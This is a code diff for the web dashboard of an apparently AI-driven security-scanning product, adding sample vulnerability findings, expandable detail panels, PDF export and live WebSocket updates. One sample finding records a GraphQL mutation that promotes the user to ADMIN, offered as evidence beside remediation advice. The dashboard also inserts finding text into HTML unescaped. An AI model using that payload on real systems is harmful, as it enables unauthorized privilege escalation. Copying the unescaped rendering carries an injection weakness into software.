+      remediation: 'Desabilite introspection em producao. No Apollo Server: new ApolloServer({ introspection: process.env.NODE_ENV !== "production" }). Implemente depth limiting e query complexity analysis.',
+      references: ['https://www.apollographql.com/blog/graphql/security/why-you-should-disable-graphql-introspection-in-production/'] },
+    { id: 'V-024', title: 'Privilege escalation via GraphQL mutation: updateUser(role: ADMIN)', severity: 'high', category: 'Authorization', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'authz-exploit', endpoint: 'POST /graphql', evidence: 'mutation { updateUser(id: "me", role: ADMIN) { role } } succeeds', cvss: 8.1, cwe: 'CWE-269',
+      explanation: 'A mutation updateUser nao valida quais campos o usuario pode alterar sobre si mesmo. O campo "role" deveria ser protegido, mas o resolver aceita e aplica a mudanca, permitindo auto-promocao para admin.',
+      impact: 'Qualquer usuario autenticado pode se tornar administrador. Acesso total ao sistema: gerenciamento de usuarios, dados financeiros, configuracoes.',
+      remediation: 'Implemente field-level authorization no resolver. Crie allowlist de campos editaveis por role: usuarios comuns so podem alterar name, email, password. O campo role so pode ser alterado por admins.',
+      references: ['https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/'] },
   ],
 
   reports: [
@@ -296,8 +392,50 @@ function initVulnerabilities() {
     const list = document.getElementById('vuln-list');
     const filtered = filter === 'all' ? Store.vulns : Store.vulns.filter(v => v.severity === filter);
     list.innerHTML = filtered.length ? filtered.map(v =>
-      `<div class="vuln-item ${v.severity}"><div class="vuln-severity ${v.severity}">${v.severity}</div><div class="vuln-info"><div class="vuln-title">${v.title}</div><div class="vuln-meta">${v.category} &middot; ${v.id} &middot; Scan #${v.scan} &middot; Agent: ${v.agent || 'n/a'} &middot; <span class="status-badge ${v.status==='open'?'failed':'success'}">${v.status}</span></div></div><div class="vuln-target">${v.target}</div></div>`
+      `<div class="vuln-item ${v.severity}" data-vuln-id="${v.id}">
+        <div class="vuln-header">
+          <div class="vuln-severity ${v.severity}">${v.severity}</div>
+          <div class="vuln-info">
+            <div class="vuln-title">${v.title}</div>
+            <div class="vuln-meta">${v.category} &middot; ${v.id} &middot; Scan #${v.scan} &middot; Agent: ${v.agent || 'n/a'} &middot; <span class="status-badge ${v.status==='open'?'failed':'success'}">${v.status}</span></div>
+          </div>
+          <div class="vuln-target">${v.target}</div>
+          <div class="vuln-expand-icon"><i class="fas fa-chevron-down"></i></div>
+        </div>
+        <div class="vuln-detail-panel">
+          <div class="vuln-detail-grid">
+            <div class="vuln-detail-section">
+              <div class="vuln-detail-label"><i class="fas fa-info-circle"></i> O que é?</div>
+              <div class="vuln-detail-text">${v.explanation || ''}</div>
+            </div>
+            <div class="vuln-detail-section">
+              <div class="vuln-detail-label"><i class="fas fa-explosion"></i> Impacto</div>
+              <div class="vuln-detail-text">${v.impact || ''}</div>
+            </div>
+            <div class="vuln-detail-section vuln-detail-full">
+              <div class="vuln-detail-label"><i class="fas fa-wrench"></i> Remediação</div>
+              <div class="vuln-detail-text">${v.remediation || ''}</div>
+            </div>
+          </div>
+          <div class="vuln-detail-footer">
+            <div class="vuln-detail-badges">
+              ${v.cvss ? `<span class="vuln-badge cvss"><i class="fas fa-gauge-high"></i> CVSS ${v.cvss}</span>` : ''}
+              ${v.cwe ? `<span class="vuln-badge cwe"><i class="fas fa-hashtag"></i> ${v.cwe}</span>` : ''}
+              ${v.endpoint ? `<span class="vuln-badge endpoint"><i class="fas fa-link"></i> ${v.endpoint}</span>` : ''}
+            </div>
+            ${v.references && v.references.length ? `<div class="vuln-detail-refs"><span class="vuln-detail-label-sm"><i class="fas fa-book"></i> Referências:</span> ${v.references.map(r => `<a href="${r}" target="_blank" rel="noopener">${r.includes('owasp') ? 'OWASP' : r.includes('portswigger') ? 'PortSwigger' : r.includes('mozilla') ? 'MDN' : r.includes('cheatsheetseries') ? 'CheatSheet' : 'Link'}</a>`).join(' ')}</div>` : ''}
+          </div>
+          ${v.evidence ? `<div class="vuln-detail-evidence"><div class="vuln-detail-label-sm"><i class="fas fa-terminal"></i> Evidência</div><code>${v.evidence}</code></div>` : ''}
+        </div>
+      </div>`
     ).join('') : '<div class="empty-state"><div class="empty-state-icon"><i class="fas fa-check-circle"></i></div><h2 class="empty-state-title">No vulnerabilities</h2><p class="empty-state-text">No findings match this filter.</p></div>';
+
+    // Add click handlers for expandable panels
+    list.querySelectorAll('.vuln-item').forEach(item => {
+      item.querySelector('.vuln-header').addEventListener('click', () => {
+        item.classList.toggle('expanded');
+      });
+    });
   }
 
   renderVulns('all');
@@ -315,8 +453,16 @@ function initVulnerabilities() {
    ======================================== */
 function initReports() {
   document.getElementById('reports-grid').innerHTML = Store.reports.map(r =>
-    `<div class="report-card"><div class="report-card-header"><div class="report-icon"><i class="fas fa-file-shield"></i></div><div><div class="report-title">${r.title}</div><div class="report-date">${r.date} &middot; Scan #${r.scan}</div></div></div><div class="report-stats"><div class="report-stat"><strong>${r.vulns}</strong> vulnerabilities</div><div class="report-stat"><strong>${r.critical}</strong> critical</div><div class="report-stat"><strong>${r.pages}</strong> pages</div></div><div class="report-footer"><span class="status-badge success">Complete</span><button class="btn-outline" style="font-size:11px;padding:5px 12px"><i class="fas fa-download"></i> ${r.deliverable.replace('.md','')}</button></div></div>`
+    `<div class="report-card"><div class="report-card-header"><div class="report-icon"><i class="fas fa-file-shield"></i></div><div><div class="report-title">${r.title}</div><div class="report-date">${r.date} &middot; Scan #${r.scan}</div></div></div><div class="report-stats"><div class="report-stat"><strong>${r.vulns}</strong> vulnerabilities</div><div class="report-stat"><strong>${r.critical}</strong> critical</div><div class="report-stat"><strong>${r.pages}</strong> pages</div></div><div class="report-footer"><span class="status-badge success">Complete</span><button class="btn-outline btn-pdf" data-scan="${r.scan}" style="font-size:11px;padding:5px 12px"><i class="fas fa-file-pdf"></i> Export PDF</button><button class="btn-outline" style="font-size:11px;padding:5px 12px"><i class="fas fa-download"></i> ${r.deliverable.replace('.md','')}</button></div></div>`
   ).join('');
+
+  // Attach PDF export
+  document.querySelectorAll('.btn-pdf').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      e.preventDefault();
+      exportReportPDF(btn.dataset.scan);
+    });
+  });
 }
 
 /* ========================================
@@ -556,9 +702,182 @@ function initMobileMenu() {
   });
 }
 
+/* ========================================
+   WEBSOCKET CLIENT - Live Updates
+   ======================================== */
+const ShieldWS = {
+  ws: null,
+  listeners: new Set(),
+
+  connect() {
+    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const url = `${proto}//${location.host}/ws`;
+
+    try {
+      this.ws = new WebSocket(url);
+    } catch {
+      console.log('[Shield WS] WebSocket not available (static mode)');
+      return;
+    }
+
+    this.ws.onopen = () => {
+      console.log('[Shield WS] Connected');
+      showToast('Live updates connected');
+    };
+
+    this.ws.onmessage = (event) => {
+      try {
+        const data = JSON.parse(event.data);
+        this.listeners.forEach(fn => fn(data));
+
+        // Handle scan events
+        if (data.type === 'scan-event') {
+          this.handleScanEvent(data);
+        }
+      } catch { /* ignore parse errors */ }
+    };
+
+    this.ws.onclose = () => {
+      console.log('[Shield WS] Disconnected, reconnecting in 5s...');
+      setTimeout(() => this.connect(), 5000);
+    };
+
+    this.ws.onerror = () => {
+      // Silent fail for static file serving (no server)
+    };
+  },
+
+  handleScanEvent(data) {
+    if (data.agent && data.status) {
+      showToast(`Agent ${data.agent}: ${data.status}`);
+    }
+
+    // Update dashboard if on that page
+    if (getPageFromHash() === 'dashboard') {
+      initDashboard();
+    }
+  },
+
+  onMessage(fn) {
+    this.listeners.add(fn);
+    return () => this.listeners.delete(fn);
+  },
+
+  send(data) {
+    if (this.ws?.readyState === WebSocket.OPEN) {
+      this.ws.send(JSON.stringify(data));
+    }
+  }
+};
+
+/* ========================================
+   PDF EXPORT (Client-side)
+   Uses browser print for PDF generation
+   ======================================== */
+function exportReportPDF(scanId) {
+  // For server mode: redirect to HTML report endpoint
+  if (location.port && location.port !== '0') {
+    window.open(`/api/reports/${scanId}/pdf`, '_blank');
+    return;
+  }
+
+  // Client-side fallback: generate printable report from Store data
+  const scan = Store.scans.find(s => s.id === scanId);
+  const scanVulns = Store.vulns.filter(v => v.scan === scanId);
+
+  const printWindow = window.open('', '_blank');
+  printWindow.document.write(`<!DOCTYPE html>
+<html lang="pt-BR"><head><meta charset="UTF-8"><title>Shield Report - ${scanId}</title>
+<style>
+  body { font-family: 'Segoe UI', system-ui, sans-serif; max-width: 800px; margin: 0 auto; padding: 40px; color: #1a1a2e; line-height: 1.6; }
+  .header { background: #2A428C; color: white; padding: 30px; border-radius: 10px; margin-bottom: 30px; }
+  .header h1 { margin: 0 0 5px; font-size: 24px; }
+  .header .subtitle { opacity: 0.8; font-size: 14px; }
+  .header .meta { margin-top: 15px; display: flex; gap: 20px; font-size: 12px; opacity: 0.9; }
+  h2 { color: #2A428C; border-bottom: 2px solid #FFEF4D; padding-bottom: 8px; margin-top: 30px; }
+  table { width: 100%; border-collapse: collapse; margin: 16px 0; }
+  th, td { border: 1px solid #e2e8f0; padding: 10px 14px; text-align: left; font-size: 13px; }
+  th { background: #f8fafc; color: #475569; font-weight: 600; }
+  .severity { display: inline-block; padding: 2px 10px; border-radius: 4px; font-size: 11px; font-weight: 700; text-transform: uppercase; }
+  .severity.critical { background: #fde8e8; color: #dc2626; }
+  .severity.high { background: #fff3e0; color: #ea580c; }
+  .severity.medium { background: #fffde7; color: #ca8a04; }
+  .severity.low { background: #e8f4fd; color: #2563eb; }
+  .vuln-card { border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px; margin: 12px 0; page-break-inside: avoid; }
+  .vuln-card h3 { margin: 0 0 8px; font-size: 14px; }
+  .vuln-card p { margin: 4px 0; font-size: 13px; color: #475569; }
+  .vuln-card .label { font-weight: 600; color: #2A428C; }
+  code { background: #f1f5f9; padding: 2px 6px; border-radius: 3px; font-size: 12px; }
+  .footer { margin-top: 40px; padding-top: 20px; border-top: 1px solid #e2e8f0; font-size: 11px; color: #94a3b8; text-align: center; }
+  .print-btn { background: #2A428C; color: white; border: none; padding: 10px 24px; border-radius: 6px; cursor: pointer; font-size: 14px; margin-bottom: 20px; }
+  @media print { .print-btn { display: none; } body { padding: 20px; } }
+</style></head><body>
+<button class="print-btn" onclick="window.print()">⬇ Imprimir / Salvar como PDF</button>
+<div class="header">
+  <h1>🛡️ ConstruData Shield</h1>
+  <div class="subtitle">Security Assessment Report</div>
+  <div class="meta">
+    <span>Scan: ${scanId}</span>
+    <span>Target: ${scan?.target || 'N/A'}</span>
+    <span>Date: ${new Date().toISOString().split('T')[0]}</span>
+  </div>
+</div>
+
+<h2>Summary</h2>
+<table>
+  <tr><th>Target</th><td>${scan?.target || 'N/A'}</td></tr>
+  <tr><th>Type</th><td>${scan?.type || 'Full Scan'}</td></tr>
+  <tr><th>Status</th><td>${scan?.status || 'Complete'}</td></tr>
+  <tr><th>Duration</th><td>${scan?.duration || 'N/A'}</td></tr>
+  <tr><th>Vulnerabilities Found</th><td>${scanVulns.length}</td></tr>
+</table>
+
+<h2>Vulnerabilities (${scanVulns.length})</h2>
+${scanVulns.map(v => `
+<div class="vuln-card">
+  <h3><span class="severity ${v.severity}">${v.severity}</span> ${v.title}</h3>
+  ${v.cvss ? `<p><span class="label">CVSS:</span> ${v.cvss}</p>` : ''}
+  ${v.cwe ? `<p><span class="label">CWE:</span> ${v.cwe}</p>` : ''}
+  ${v.endpoint ? `<p><span class="label">Endpoint:</span> <code>${v.endpoint}</code></p>` : ''}
+  ${v.explanation ? `<p><span class="label">Descrição:</span> ${v.explanation}</p>` : ''}
+  ${v.impact ? `<p><span class="label">Impacto:</span> ${v.impact}</p>` : ''}
+  ${v.remediation ? `<p><span class="label">Remediação:</span> ${v.remediation}</p>` : ''}
+  ${v.evidence ? `<p><span class="label">Evidência:</span> <code>${v.evidence}</code></p>` : ''}
+</div>`).join('')}
+
+<div class="footer">
+  ConstruData Shield &copy; ${new Date().getFullYear()} — AI-Powered Security Testing Platform<br>
+  This report is confidential and intended for authorized personnel only.
+</div>
+</body></html>`);
+  printWindow.document.close();
+}
+
+// Attach PDF export to report download buttons
+function attachReportExports() {
+  document.querySelectorAll('.report-card .btn-outline').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      e.preventDefault();
+      const card = btn.closest('.report-card');
+      const scanText = card?.querySelector('.report-date')?.textContent || '';
+      const scanMatch = scanText.match(/Scan #([\w-]+)/);
+      const scanId = scanMatch ? scanMatch[1] : Store.scans[0]?.id || 'SC-7f3a1b2c';
+      exportReportPDF(scanId);
+    });
+  });
+}
+
 /* ── Init ── */
 window.addEventListener('hashchange', () => navigate(getPageFromHash()));
 document.addEventListener('DOMContentLoaded', () => {
   navigate(getPageFromHash());
   initMobileMenu();
+  ShieldWS.connect();
+
+  // Register service worker for PWA
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('./sw.js').catch(() => {
+      // Silent fail - PWA is progressive enhancement
+    });
+  }
 });
